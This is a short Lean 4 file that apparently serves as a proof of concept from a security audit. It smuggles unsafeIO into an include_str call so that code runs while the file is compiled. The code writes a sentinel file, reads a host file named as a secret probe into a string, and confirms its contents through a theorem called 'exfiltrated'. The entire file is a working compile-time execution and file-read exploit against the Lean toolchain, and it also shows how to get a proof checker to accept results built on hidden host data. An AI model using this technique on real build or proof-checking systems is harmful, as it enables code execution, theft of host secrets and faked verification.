module
public section
@[expose] def payload : String :=
  include_str (unsafe (
    match unsafeIO (do
      IO.FS.writeFile "/Volumes/AgentStorage/fm/tmp/2312-d-review/sentinel_zero_import_rce.txt" "ZERO_IMPORT_IO_EXECUTED_IN_AUDIT"
      return System.FilePath.mk "/Volumes/AgentStorage/fm/tmp/2312-d-review/host_secret_probe.txt") with
    | .ok p => p
    | .error _ => System.FilePath.mk ""))
theorem exfiltrated : payload = "TOP_SECRET_HOST_CONTENT_42\n" := rfl
